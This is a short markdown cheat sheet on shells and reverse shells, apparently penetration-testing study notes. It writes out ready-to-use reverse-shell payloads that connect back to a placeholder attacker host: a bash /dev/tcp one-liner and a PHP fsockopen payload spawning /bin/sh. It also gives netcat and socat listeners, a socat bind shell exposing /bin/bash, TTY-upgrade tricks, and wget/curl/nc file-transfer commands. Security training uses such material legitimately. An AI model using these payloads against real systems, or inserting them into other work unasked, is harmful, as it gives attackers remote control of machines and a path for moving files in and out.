# Shells
## Shells and Reverse Shells Cheat Sheet
| **Topic**                   | **Description**                                                                                     | **Examples/Commands**                                                              |
|-----------------------------|-----------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------|
| **Shells**                  | Interfaces to interact with an operating system (e.g., command line).                              | Bash, Zsh, CMD, PowerShell                                                        |
| **Reverse Shell**           | A shell initiated by the target machine to connect back to the attacker's machine.                 | `nc -lvnp 4444` (listener), `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` (payload)       |
| **How Reverse Shells Work** | Attacker sets up a listener, victim executes the payload, creating a connection back to the attacker.| `rlwrap nc -lvnp 4444` + victim payload                                           |
| **Where to Find Them**      | Reverse shell scripts are available on repositories like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). | Python, Bash, PHP, and PowerShell scripts.                                        |
| **Most Used Shells**        | Common shells for basic interaction and exploitation.                                               | `bash`, `sh`, `cmd.exe`, `powershell.exe`, `/bin/zsh`                             |
| **Simple Reverse Shells**   | Lightweight and easy-to-execute payloads for basic connectivity.                                   | `php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`         |
| **Advanced Shells**         | Feature-rich shells offering better usability and tools.                                           | PowerShell, socat, Python reverse shells.                                         |
| **`rlwrap`**                | A tool to wrap readline functionality for command-line utilities that lack it (e.g., netcat).      | `rlwrap nc -lvnp 4444`                                                            |
| **Netcat (nc)**             | A networking tool commonly used for setting up listeners and reverse shells.                       | `nc -lvnp <PORT>` (listener)                                                      |
| **Socat**                   | An advanced alternative to Netcat, supports encrypted connections and more protocols.              | `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash`                           |
| **Upgrading a Shell**       | Converting a simple shell into a fully interactive TTY shell.                                      | `python3 -c 'import pty; pty.spawn("/bin/bash")'`                                  |
| **File Transfer with Shells**| Using shells to upload/download files between attacker and victim.                                | `wget <URL>`, `curl -O <URL>`, `nc -lvp <PORT> > file`                            |

---

### Common Shell Commands and Tips

| **Command**                                | **Purpose**                                                                       |
|--------------------------------------------|-----------------------------------------------------------------------------------|
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive shell.                                            |
| `export TERM=xterm`                        | Fix terminal display issues in a simple shell.                                    |
| `CTRL + Z`                                 | Background the current shell process.                                             |
| `stty raw -echo` and `fg`                  | Fix line formatting issues when bringing a shell to the foreground.               |
| `rlwrap nc -lvnp <PORT>`                   | Use `rlwrap` for history and arrow key navigation in Netcat shells.               |
| `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash` | Start an advanced reverse shell listener.                                         |
| `php -r '...'`                             | Execute a PHP reverse shell payload.                                              |
